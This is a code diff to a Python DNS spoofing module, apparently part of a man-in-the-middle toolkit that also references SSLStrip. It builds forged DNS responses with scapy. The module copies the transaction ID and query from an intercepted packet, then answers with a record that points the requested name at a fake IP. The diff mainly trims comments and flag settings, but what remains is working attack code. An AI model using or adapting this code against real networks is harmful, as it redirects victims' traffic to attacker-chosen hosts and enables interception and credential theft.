@@ -1,6 +1,6 @@
 from CommandModule import *
 from scapy.all import *
-from SSLStrip import NetSetup
+from NetEnvManager import *
 from netfilterqueue import NetfilterQueue
 import _thread
 
@@ -78,32 +78,13 @@ class DnsSpoofing(CommandModule) :
         udp.dport = pkt[UDP].sport
 
         dns = DNS()
-        # Transaction ID.
-        dns.id = pkt[DNS].id
-        # Flags
-        dns.qr      = 1		# query or response.
-        dns.opcode  = 0		# Opcode.
-        dns.aa      = 0		# Authoritative. (Server is an authority for domain or not)
-        dns.tc      = 0		# Truncated. (Message is truncated or not)
-        dns.rd      = 0		# Recursion desired.
-        dns.ra      = 0		# Recursion available.
-        dns.z       = 0		# Reserved.
-        dns.ad      = 0		# Answer authenticated.
-        dns.cd      = 0		# Non-authenticated data.
-        dns.zcode   = 0		# Reply code.
-        # COUNT
-        dns.qdcount = 1		# Question count.
-        dns.ancount = 1		# Answer count.
-        dns.nscount = 0		# Authority count.
-        dns.arcount = 0		# Additional count.
-        # Queries.
+        dns.id = pkt[DNS].id	# Transaction ID.
+        dns.qr      = 1			# query or response.
+        dns.rd      = 0			# Recursion desired.
+        dns.qdcount = 1			# Question count.
+        dns.ancount = 1			# Answer count.
         dns.qd = pkt[DNS].qd
-        # Answers.
         dns.an = DNSRR(rrname=pkt[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=fakeIp)
-        # Authority.
-        dns.ns = None
-        # Additional.
-        dns.ar = None
 
         resp = ip/udp/dns
         # resp.show()
